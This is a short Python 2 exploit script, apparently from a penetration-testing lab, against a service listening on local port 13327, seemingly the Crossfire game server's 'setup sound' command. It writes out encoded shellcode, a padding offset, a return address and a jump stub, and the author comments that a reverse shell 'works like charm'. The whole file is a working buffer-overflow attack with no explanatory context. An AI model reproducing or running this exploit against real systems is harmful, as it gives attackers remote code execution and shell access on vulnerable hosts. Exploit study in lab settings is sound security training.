#!/usr/bin/python	
import socket		
buffer=["A"]	
counter=100




LPORT13327 =  ""
LPORT13327 += "\xbe\x25\xf6\xa6\xe0\xd9\xed\xd9\x74\x24\xf4"
LPORT13327 += "\x5a\x33\xc9\xb1\x14\x83\xc2\x04\x31\x72\x10"
LPORT13327 += "\x03\x72\x10\xc7\x03\x97\x3b\xf0\x0f\x8b\xf8"
LPORT13327 += "\xad\xa5\x2e\x76\xb0\x8a\x49\x45\xb2\xb0\xcb"
LPORT13327 += "\x07\xda\x44\xf4\xb6\x46\x23\xe4\xe9\x26\x3a"
LPORT13327 += "\xe5\x60\xa0\x64\x2b\xf4\xa5\xd4\xb7\x46\xb1"
LPORT13327 += "\x66\xd1\x65\x39\xc5\xae\x10\xf4\x4a\x5d\x85"
LPORT13327 += "\x6c\x74\x3a\xfb\xf0\xc3\xc3\xfb\x98\xfc\x1c"
LPORT13327 += "\x8f\x30\x6b\x4c\x0d\xa9\x05\x1b\x32\x79\x89"
LPORT13327 += "\x92\x54\xc9\x26\x68\x16"




#Bingo this works--Had an issue with bad chars.Rev shell also works like charm
ret="\x97\x45\x13\x08"
crash=LPORT13327 +"\x41" *(4368-105) +ret + "\x83\xC0\x0C\xFF\xE0" +  "\x90\x90"

#crash="/x41" * 4379
buffer = "\x11(setup sound " +crash + "\x90\x00#"
buffer = "\x11(setup sound "+ crash + "\x90\x00#"
	
if 1:	
   print"Fuzzing PASS with %s bytes" %	len(buffer)	
   #print str(string)	
   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)	
   connect=s.connect(('127.0.0.1',13327))	
   data=s.recv(1024)	
   #print str(data)
   print(data)	
   s.send(buffer)
   #data=s.recv(1024)
   #print str(data)	
   print "done"
   #s.send('QUIT\r\n')		
   s.close()	
  
